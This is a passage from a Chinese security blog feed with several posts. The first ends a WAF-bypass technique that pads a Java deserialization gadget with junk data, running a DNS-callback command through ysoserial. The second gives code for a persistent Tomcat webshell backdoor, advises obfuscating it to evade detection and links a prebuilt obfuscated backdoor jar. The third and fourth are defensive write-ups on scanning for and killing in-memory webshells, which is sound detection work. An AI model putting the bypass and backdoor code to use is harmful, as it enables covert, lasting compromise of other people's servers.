class="comment">//脏数据内容</span></span><br><span class="line">    <span class="keyword">private</span> Object gadget; <span class="comment">// ysoserila gadget对象</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DirtyDataWrapper</span><span class="params">(Object gadget, <span class="keyword">int</span> dirtyDataSize)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.gadget = gadget;</span><br><span class="line">        <span class="keyword">this</span>.dirtyDataSize = dirtyDataSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将脏数据和gadget对象存到集合对象中</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 一个包裹脏数据和gadget对象可序列化对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">doWrap</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Object wrapper = <span class="keyword">null</span>;</span><br><span class="line">        dirtyData = getLongString(dirtyDataSize);</span><br><span class="line">        <span class="keyword">int</span> type = (<span class="keyword">int</span>)(Math.random() * <span class="number">10</span>) % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">switch</span> (type)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                List&lt;Object&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line">                arrayList.add(dirtyData);</span><br><span class="line">                arrayList.add(gadget);</span><br><span class="line">                wrapper = arrayList;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                List&lt;Object&gt; linkedList = <span class="keyword">new</span> LinkedList&lt;Object&gt;();</span><br><span class="line">                linkedList.add(dirtyData);</span><br><span class="line">                linkedList.add(gadget);</span><br><span class="line">                wrapper = linkedList;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                HashMap&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">                map.put(<span class="string">"a"</span>,dirtyData);</span><br><span class="line">                map.put(<span class="string">"b"</span>,gadget);</span><br><span class="line">                wrapper = map;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                LinkedHashMap&lt;String,Object&gt; linkedHashMap = <span class="keyword">new</span> LinkedHashMap&lt;String,Object&gt;();</span><br><span class="line">                linkedHashMap.put(<span class="string">"a"</span>,dirtyData);</span><br><span class="line">                linkedHashMap.put(<span class="string">"b"</span>,gadget);</span><br><span class="line">                wrapper = linkedHashMap;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                TreeMap&lt;String,Object&gt; treeMap = <span class="keyword">new</span> TreeMap&lt;String, Object&gt;();</span><br><span class="line">                treeMap.put(<span class="string">"a"</span>,dirtyData);</span><br><span class="line">                treeMap.put(<span class="string">"b"</span>,gadget);</span><br><span class="line">                wrapper = treeMap;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> wrapper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生产随机字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> length 随机字符串长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 随机字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getLongString</span><span class="params">(<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">        String str = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">            str += <span class="string">"x"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Object cc6 = <span class="keyword">new</span> CommonsCollections6().getObject(<span class="string">"raw_cmd:nslookup xxx.dnslog.cn"</span>);</span><br><span class="line">        DirtyDataWrapper dirtyDataFactory = <span class="keyword">new</span> DirtyDataWrapper(cc6,<span class="number">100</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"/tmp/cc6.ser"</span>));</span><br><span class="line">        objectOutputStream.writeObject(dirtyDataFactory.doWrap());</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码请移步<a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker" target="_blank" rel="noopener">ysoserial-for-woodpecker</a>项目。通过如下命令就可以生成带有<code>40000脏数据</code>的CommsonCollects6序列化数据。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-for-woodpecker-&lt;version&gt;.jar -g CommonsCollections6 -a <span class="string">"raw_cmd:nslookup win.4lu19g.dnslog.cn"</span> --dirt-data-length 400000 &gt; cc6-dnslog.ser</span><br></pre></td></tr></table></figure><p> 把<code>cc6-dnslog.ser</code>复制到burp中发送，完美饶过waf收到dnslog!</p><p><img src="/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/bypass-waf.png" alt="成功绕过WAF"></p><h2 id="0x04-留一个小问题"><a href="#0x04-留一个小问题" class="headerlink" title="0x04 留一个小问题"></a>0x04 留一个小问题</h2><p>其实不是所有的集合类都适合用于包裹脏数据和gadget，比如<code>LinkedHashSet</code>,<code>HashSet</code>，<code>TreeSet</code>等类就不适合。至于为何，留给大家思考。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> 绕WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一种tomcat中间件留持久化后门的思路</title>
      <link href="/articles/2021/an-idea-of-keeping-persistent-backdoor-in-tomcat-middleware/"/>
      <url>/articles/2021/an-idea-of-keeping-persistent-backdoor-in-tomcat-middleware/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>在红队行动中，内存马虽然好用，但是它存在的最大的问题是重启之后就失效了。这时候留持久化后门就是一个刚需了。今天简单分享一个构造Tomcat中间件持久化后门的思路。</p><h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p>相信通过<code>@Filter/@Servlet</code>标签来实现Tomcat后门的想法已经被用烂了，这里分享一个比较冷门的接口<code>ServletContainerInitializer</code>。它是<code>Servlet 3.0</code>新增的一个接口，主要用于在容器启动阶段通过编程风格注册web三大组件<code>Filter</code>, <code>Servlet</code>以及<code>Listener</code>，以取代通过web.xml配置注册，减少了对配置的依赖。我们可以用这样的机制来注册一个实现了webshell功能的组件，下面以注册Filter为例简单示范一下。</p><h2 id="0x03-实现"><a href="#0x03-实现" class="headerlink" title="0x03 实现"></a>0x03 实现</h2><p>首先我们编写一个class实现<code>ServletContainerInitializer</code>接口，其中<code>onStartup</code>方法会在Tomcat中间件重启加载当前webapp会优先执行这个方法。通过改方法，我们可以注册一个webshell的filter。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.HandlesTypes;</span><br><span class="line"><span class="keyword">import</span> java.util.EnumSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="meta">@HandlesTypes</span>(&#123;MainFilter.class&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainFilterInitializer</span> <span class="keyword">implements</span> <span class="title">ServletContainerInitializer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStartup</span><span class="params">(Set&lt;Class&lt;?&gt;&gt; set, ServletContext servletContext)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        <span class="comment">// 将webshell filter注册到上下文当中</span></span><br><span class="line">        FilterRegistration.Dynamic filter = servletContext.addFilter(MainFilter.class.getSimpleName(), MainFilter.class);</span><br><span class="line">        EnumSet&lt;DispatcherType&gt; dispatcherTypes = EnumSet.allOf(DispatcherType.class);</span><br><span class="line">        dispatcherTypes.add(DispatcherType.REQUEST);</span><br><span class="line">        dispatcherTypes.add(DispatcherType.FORWARD);</span><br><span class="line">        <span class="comment">// 设置webshell filter的访问路径</span></span><br><span class="line">        filter.addMappingForUrlPatterns(dispatcherTypes, <span class="keyword">true</span>, <span class="string">"/*"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后在打包jar之前创建一个文件<code>META-INF/services/javax.servlet.ServletContainerInitializer</code>，并填写以上class名即可。</p><p>为了兼容性我们最好使用jdk1.5进行编译，同时为了防止被行为分析我们最好对代码进行混淆。</p><p>最后分享给大家一个我自己做好的一个后门给大家做一个参考。</p><p><a href="tomcat-lib-backdoor-obfuscated.jar">下载地址</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Filter/Servlet型内存马的扫描抓捕与查杀</title>
      <link href="/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/"/>
      <url>/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>在内存马横行的当下，蓝队or应急的师傅如何能快速判断哪些Filter/Servlet是内存马，分析内存马的行为功能是什么？最终又如何不重启的将其清除？红队师傅又如何抓铺其他师傅的内存马为自己用，亦或是把师傅的内存马踢掉？</p><p>在当下攻防对抗中，一直缺少着针对内存马扫描，捕捉与查杀的辅助脚本。下面就以<code>Tomcat 8.5.47</code>为例子，分享下编写方法，其他中间件万变不离其宗。</p><p>考虑到Agent技术针对红队来说比较重，我们这次使用jsp技术来解决以上问题。</p><h2 id="0x02-扫描Filter和Servlet"><a href="#0x02-扫描Filter和Servlet" class="headerlink" title="0x02 扫描Filter和Servlet"></a>0x02 扫描Filter和Servlet</h2><p>要想扫描web应用内存中的Filter和Servlet，我们必须知道它们存储的位置。通过查看代码，我们知道StandardContext对象中维护的是一个</p><p>和Filter相关的是<code>filterDefs</code>和<code>filterMaps</code>两个属性。这两个属性分别维护着全局Filter的定义，以及Filter的映射关系。</p><p><img src="/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/filterMaps-filterRefs.png" alt="filterMaps和filterRefs属性结构"></p><p>和Servlet相关的是<code>children</code>和<code>servletMappings</code>两个属性。这两个属性分别维护这全家Servlet的定义，以及Servlet的映射关系。</p><p><img src="/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/servletMappings.png" alt="servletMappings属性结构"></p><p><img src="/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/children.png" alt="children属性结构"></p><p>其他request对象中就存储这StandardContext对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.getSession().getServletContext() &#123;ApplicationContextFacade&#125;</span><br><span class="line">  -&gt; context &#123;ApplicationContext&#125; </span><br><span class="line">    -&gt; context &#123;StandardContext&#125;</span><br><span class="line">      * filterDefs</span><br><span class="line">      * filterMaps</span><br><span class="line">      * children</span><br><span class="line">      * servletMappings</span><br></pre></td></tr></table></figure><p>所以我们只需要通过反射遍历request，最终就可以拿到Filter和Servlet的如下信息。</p><ul><li>Filter/Servlet名</li><li>匹配路径</li><li>Class名</li><li>ClassLoader</li><li>Class文件存储路径。</li><li>内存中Class字节码（方便反编译审计其是否存在恶意代码）</li><li>该Class是否有对应的磁盘文件（判断内存马的重要指标）</li></ul><p>具体反射遍历代码放文末github，这里值得一提是拿到Class名通过如下方法就能拿到其被加载到内存中的字节码内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] classBytes = Repository.lookupClass(Class.forName(<span class="string">"me.gv7.Memshell"</span>)).getBytes();</span><br></pre></td></tr></table></figure><h2 id="0x03-注销Filter内存马"><a href="#0x03-注销Filter内存马" class="headerlink" title="0x03 注销Filter内存马"></a>0x03 注销Filter内存马</h2><p>通过分析调试Tomcat源码，我们知道Tomcat注销filter其实就是将该Filter从全局filterDefs和filterMaps中清除掉。具体的操作分别如下<code>removeFilterDef</code>和<code>removeFilterMap</code>两个方法中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.core.StandardContext#removeFilterDef</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeFilterDef</span><span class="params">(FilterDef filterDef)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="keyword">this</span>.filterDefs) &#123;</span><br><span class="line">        <span class="keyword">this</span>.filterDefs.remove(filterDef.getFilterName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.fireContainerEvent(<span class="string">"removeFilterDef"</span>, filterDef);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//org.apache.catalina.core.StandardContext#removeFilterMap</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeFilterMap</span><span class="params">(FilterMap filterMap)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.filterMaps.remove(filterMap);</span><br><span class="line">    <span class="keyword">this</span>.fireContainerEvent(<span class="string">"removeFilterMap"</span>, filterMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只需要反射调用它们即可注销Filter。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">deleteFilter</span><span class="params">(HttpServletRequest request,String filterName)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Object standardContext = getStandardContext(request);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// org.apache.catalina.core.StandardContext#removeFilterDef</span></span><br><span class="line">    HashMap&lt;String,Object&gt; filterConfig = getFilterConfig(request);</span><br><span class="line">    Object appFilterConfig = filterConfig.get(filterName);</span><br><span class="line">    Field _filterDef = appFilterConfig.getClass().getDeclaredField(<span class="string">"filterDef"</span>);</span><br><span class="line">    _filterDef.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object filterDef = _filterDef.get(appFilterConfig);</span><br><span class="line">    Method removeFilterDef = standardContext.getClass().getDeclaredMethod(<span class="string">"removeFilterDef"</span>, <span class="keyword">new</span> Class[]&#123;org.apache.tomcat.util.descriptor.web.FilterDef.class&#125;);</span><br><span class="line">    removeFilterDef.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    removeFilterDef.invoke(standardContext,filterDef);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// org.apache.catalina.core.StandardContext#removeFilterMap</span></span><br><span class="line">    Object[] filterMaps = getFilterMaps(request);</span><br><span class="line">    <span class="keyword">for</span>(Object filterMap:filterMaps)&#123;</span><br><span class="line">        Field _filterName = filterMap.getClass().getDeclaredField(<span class="string">"filterName"</span>);</span><br><span class="line">        _filterName.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        String filterName0 = (String)_filterName.get(filterMap);</span><br><span class="line">        <span class="keyword">if</span>(filterName0.equals(filterName))&#123;</span><br><span class="line">            Method removeFilterMap = standardContext.getClass().getDeclaredMethod(<span class="string">"removeFilterMap"</span>, <span class="keyword">new</span> Class[]&#123;org.apache.catalina.deploy.FilterMap.class&#125;);</span><br><span class="line">            removeFilterDef.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            removeFilterMap.invoke(standardContext,filterMap);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-注销Servlet内存马"><a href="#0x04-注销Servlet内存马" class="headerlink" title="0x04 注销Servlet内存马"></a>0x04 注销Servlet内存马</h2><p>注销Servlet的原理也是类似，将该Servlet从全局servletMappings和children中清除掉即可。在Tomcat源码中对应的是<code>removeServletMapping</code>和<code>removeChild</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.core.StandardContext#removeServletMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeServletMapping</span><span class="params">(String pattern)</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="keyword">this</span>.servletMappingsLock) &#123;</span><br><span class="line">        name = (String)<span class="keyword">this</span>.servletMappings.remove(pattern);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Wrapper wrapper = (Wrapper)<span class="keyword">this</span>.findChild(name);</span><br><span class="line">    <span class="keyword">if</span> (wrapper != <span class="keyword">null</span>) &#123;</span><br><span class="line">        wrapper.removeMapping(pattern);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.fireContainerEvent(<span class="string">"removeServletMapping"</span>, pattern);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//org.apache.catalina.core.StandardContext#removeChild</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeChild</span><span class="params">(Container child)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(child <span class="keyword">instanceof</span> Wrapper)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(sm.getString(<span class="string">"standardContext.notWrapper"</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.removeChild(child);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只需要反射调用它们即可注销Servlet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">deleteServlet</span><span class="params">(HttpServletRequest request,String servletName)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    HashMap&lt;String,Object&gt; childs = getChildren(request);</span><br><span class="line">    Object objChild = childs.get(servletName);</span><br><span class="line">    String urlPattern = <span class="keyword">null</span>;</span><br><span class="line">    HashMap&lt;String,String&gt; servletMaps = getServletMaps(request);</span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;String,String&gt; servletMap:servletMaps.entrySet())&#123;</span><br><span class="line">        <span class="keyword">if</span>(servletMap.getValue().equals(servletName))&#123;</span><br><span class="line">            urlPattern = servletMap.getKey();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(urlPattern != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 反射调用 org.apache.catalina.core.StandardContext#removeServletMapping</span></span><br><span class="line">        Object standardContext = getStandardContext(request);</span><br><span class="line">        Method removeServletMapping = standardContext.getClass().getDeclaredMethod(<span class="string">"removeServletMapping"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;);</span><br><span class="line">        removeServletMapping.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        removeServletMapping.invoke(standardContext, urlPattern);</span><br><span class="line">        <span class="comment">// Tomcat 6必须removeChild 789可以不用</span></span><br><span class="line">        <span class="comment">// 反射调用 org.apache.catalina.core.StandardContext#removeChild</span></span><br><span class="line">        Method removeChild = standardContext.getClass().getDeclaredMethod(<span class="string">"removeChild"</span>, <span class="keyword">new</span> Class[]&#123;org.apache.catalina.Container.class&#125;);</span><br><span class="line">        removeChild.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        removeChild.invoke(standardContext, objChild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-演示"><a href="#0x05-演示" class="headerlink" title="0x05 演示"></a>0x05 演示</h2><p>我们只需要把编写好的<code>tomcat-memshell-scanner.jsp</code>放到可能被注入内存的web项目中，然后通过浏览器访问即可。假设扫描结果如下：</p><p><img src="/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/tomcat-memshell-scan-result.png" alt="Tomcat内存马扫描结果"></p><p>通过分析扫描出的信息，可知<code>filter-b2b1cad2-44be-4f43-8db0-bd43da5ad368</code>是Filter型内存马，原因如下：</p><ol><li>classLoader是可疑的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader</code>,这是反序列化漏洞执行代码用的classLoader。</li><li>class在磁盘中没有对应的class文件，只驻留在内存。</li></ol><p><code>/favicon.ico</code>是Servlet型内存马，判断原因如下。</p><ol><li>classLoader是自定义classLoader,当下比较流行的java webshell基本都是自定义了class loader来实现任意代码执行。</li><li>class在磁盘中没有对应的class文件，只驻留在内存。</li></ol><p>最后我们可以dump出那么对应的class，反编译看代码分析<code>filter-b2b1cad2-44be-4f43-8db0-bd43da5ad368</code>是Filter型cmd内存马，<code>/favicon.ico</code>是Servlet型哥斯拉内存马。</p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>查杀Java web filter型内存马</title>
      <link href="/articles/2020/kill-java-web-filter-memshell/"/>
      <url>/articles/2020/kill-java-web-filter-memshell/</url>
      
        <content type="html"><![CDATA[<blockquote><p>想法早在几个月之前就有了，月初收好友之邀请，夜游鼓浪屿，彼时夜朗星稀，山海一色，偶有微波抚足，不觉间有了点写东西的感觉，晚上回到旅社简单写了下。等回到北京后，不料润色之意全无，就凑合看吧。</p></blockquote><p><img src="/articles/2020/kill-java-web-filter-memshell/gulangyu01.jpeg" alt></p><p><img src="/articles/2020/kill-java-web-filter-memshell/gulangyu02.jpeg" alt></p><h2 id="0x01-内存马简历史"><a href="#0x01-内存马简历史" class="headerlink" title="0x01 内存马简历史"></a>0x01 内存马简历史</h2><p>其实内存马由来已久，早在17年n1nty师傅的<a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw" target="_blank" rel="noopener">《Tomcat源码调试笔记-看不见的shell》</a>中已初见端倪，但一直不温不火。后经过rebeyong师傅使用<a href="https://www.cnblogs.com/rebeyond/p/9686213.html" target="_blank" rel="noopener">agent技术</a>加持后，拓展了内存马的使用场景，然终停留在奇技淫巧上。在各类hw洗礼之后，文件shell明显气数已尽。内存马以救命稻草的身份重回大众视野。特别是今年在shiro的回显研究之后，引发了无数安全研究员对内存webshell的研究，其中涌现出了LandGrey师傅构造的<a href="https://landgrey.me/blog/12/" target="_blank" rel="noopener">Spring controller内存马</a>。至此内存马开枝散叶发展出了三大类型：</p><ol><li>servlet-api类<ul><li>filter型</li><li>servlet型</li></ul></li><li>spring类<ul><li>拦截器</li><li>controller型</li></ul></li><li>Java Instrumentation类<ul><li>agent型</li></ul></li></ol><p>内存马这坛深巷佳酒，一时间流行于市井与弄堂之间。上至安全研究员下至普通客户，人尽皆知。正值hw来临之际，不难推测届时必将是内存马横行天下之日。而各大安全厂商却迟迟未见动静。所谓表面风平浪静，实则暗流涌动。或许一场内存马的围剿计划正慢慢展开。作为攻击方向的研究人员，没有对手就制造对手,攻防互换才能提升内存马技术的发展。</p><h2 id="0x02-查杀思路"><a href="#0x02-查杀思路" class="headerlink" title="0x02 查杀思路"></a>0x02 查杀思路</h2><p>我们判断逻辑很朴实，利用Java Agent技术遍历所有已经加载到内存中的class。先判断是否是内存马，是则进入内存查杀。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Transformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader classLoader, String s, Class&lt;?&gt; aClass, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] bytes) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">    <span class="comment">// 识别内存马</span></span><br><span class="line">    <span class="keyword">if</span>(isMemshell(aClass,bytes))&#123;</span><br><span class="line">        <span class="comment">// 查杀内存马</span></span><br><span class="line">        <span class="keyword">byte</span>[] newClassByte = killMemshell(aClass,bytes);</span><br><span class="line">        <span class="keyword">return</span> newClassByte;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-内存马的识别"><a href="#0x03-内存马的识别" class="headerlink" title="0x03 内存马的识别"></a>0x03 内存马的识别</h2><p>要识别，我们就需要细思内存马有什么特征。下面列下我思考过的检查点。</p><ol><li>filter名字很特别</li></ol><p>内存马的Filter名一般比较特别，有<code>shell</code>或者随机数等关键字。这个特征稍弱，因为这取决于内存马的构造者的习惯，构造完全可以设置一个看起来很正常的名字。</p><ol start="2"><li>filter优先级是第一位</li></ol><p>为了确保内存马在各种环境下都可以访问，往往需要把filter匹配优先级调至最高，这在shiro反序列化中是刚需。但其他场景下就非必须，只能做一个可疑点。</p><ol start="2"><li>对比web.xml中没有filter配置</li></ol><p>内存马的Filter是动态注册的，所以在web.xml中肯定没有配置，这也是个可以的特征。但servlet 3.0引入了<code>@WebFilter</code>标签方便开发这动态注册Filter。这种情况也存在没有在web.xml中显式声明，这个特征可以作为较强的特征。</p><ol 